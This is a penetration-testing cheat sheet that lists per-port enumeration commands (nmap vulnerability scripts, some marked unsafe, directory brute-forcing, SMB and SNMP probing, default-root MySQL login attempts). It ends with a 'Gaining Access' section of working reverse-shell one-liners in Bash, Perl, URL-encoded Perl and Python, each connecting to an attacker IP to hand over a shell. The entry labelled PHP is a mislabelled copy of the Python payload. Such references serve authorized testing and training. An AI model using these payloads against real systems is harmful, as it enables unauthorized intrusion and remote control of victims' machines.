# Pentest Cheat Sheet

#### Enumeration

- ##### General Enumeration:

    - ```nmap -vv -Pn -A -sC -sS -T 4 -p- <ip address>```
    
    - Verbose, SYN Stealth, Version info, and Scripts Against Service. 
    ```nmap -v -sS -A -T4 x.x.x.x```

    - ```netdiscover -r 192.168.1.0/24```


- ##### FTP Enumeration (21):

    - ```nmap –script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p <ip address> ```

- ##### SSH (22):

    - ```ssh <ip address> 22```

- ##### SMTP Enumeration (25):
    - ```nmap –script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 <ip address>```
    - ```telnet <ip address> 25```
    - ```nc -nvv <ip address> 25```
    - ```smtp-user-enum -U /usr/share/wordlists/names.txt -t <ip address> -m 150```


- ##### Web Enumeration (80/443):

    - ```nikto -h <ip address|url>```
    - **dirb**
    ```dirb <url>```
    ```dirb http://target.com /path/to/wordlist```
    ```dirb http://target.com /path/to/wordlist -X .sh,.txt,.htm,.php,.cgi,.html,.pl,.bak,.old```
    - **Dirsearch**
    ``` dirsearch -u target.com -e sh,txt,htm,php,cgi,html,pl,bak,old ```
    ```dirsearch -u target.com -e sh,txt,htm,php,cgi,html,pl,bak,old -w path/to/wordlist```
    ```dirsearch -u https://target.com -e .```
    - **Gobuster**
    ```gobuster -u https://target.com -w /usr/share/wordlists/dirb/big.txt```

- ##### Pop3 (110):

    - ```telnet <ip address> 110```

- ##### RPCBind (111):

    - ```rpcinfo –p <ip address>```
    - ```rpcclient -p 111 -U "" <ip address>```

- ##### SMB\RPC Enumeration (139/445):

    - **Enum4linux**
    ```enum4linux –a <ip address>```
    - ```nmap <ip address> --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse```
    - ```nmap -vv --reason -Pn -sU -sV -p 137 --script="smb-vuln-ms06-025" --script-args="unsafe=1" <ip address>```
    - ```nmap -vv --reason -Pn -sU -sV -p 137 --script="smb-vuln-ms07-029" --script-args="unsafe=1" <ip address>```
    - ```nmap -vv --reason -Pn -sU -sV -p 137 --script="smb-vuln-ms08-067" --script-args="unsafe=1" <ip address>```
    - ```smbclient -L //<ip address>/```

- ##### SNMP Enumeration (161):

    - ```nmap -sT -p 161 <ip address> -oG snmp_results.txt```
    
    - ```nmap -sV -p 161 --script=snmp-info <ip address>```

    - ```snmpwalk -c public -v1 <ip address>```

    - ```snmpenum -t <ip address>```

- ##### MSSQL Enumeration (1433):

    - ```nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER <ip address>```

- ##### Oracle (1521):

    - ```tnscmd10g version -h <ip address>```

    - ```tnscmd10g status -h <ip address>```

- ##### Mysql Enumeration (3306):

    - **Try remote default Root access**
    ```mysql -h Target_ip -u root -p```

    - ```nmap -sV -Pn -vv <ip address> -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122```
    

#### Gaining Access

- ##### Reverse Shell

    - **Bash**
    ```bash -i >& /dev/tcp/10.0.0.1/8080 0>&1```

    - **Perl**
    ```perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```

    - **URL-Encoded Perl: Linux**
    ```echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew```

    - **Python**
    ```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

    - **PHP**
    ```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

    